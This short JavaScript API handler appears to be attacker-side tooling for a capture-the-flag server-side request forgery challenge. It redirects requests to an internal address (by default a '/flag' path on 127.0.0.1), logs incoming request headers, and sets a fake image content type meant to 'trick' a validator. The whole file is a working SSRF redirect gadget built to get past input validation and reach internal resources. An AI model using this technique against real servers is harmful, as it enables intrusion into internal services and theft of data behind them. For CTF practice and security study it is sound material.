// Redirect to internal endpoint
// This will be called by Next.js, then redirect to internal resources

export default function handler(req, res) {
  const target = req.query.t || 'http://127.0.0.1:3000/flag';
  
  console.log('=== REDIRECT ===');
  console.log('Redirecting to:', target);
  console.log('Headers:', JSON.stringify(req.headers));
  console.log('================');
  
  // Try different redirect techniques
  res.setHeader('Location', target);
  res.setHeader('Content-Type', 'image/png'); // Might trick validator
  res.status(302).end();
}
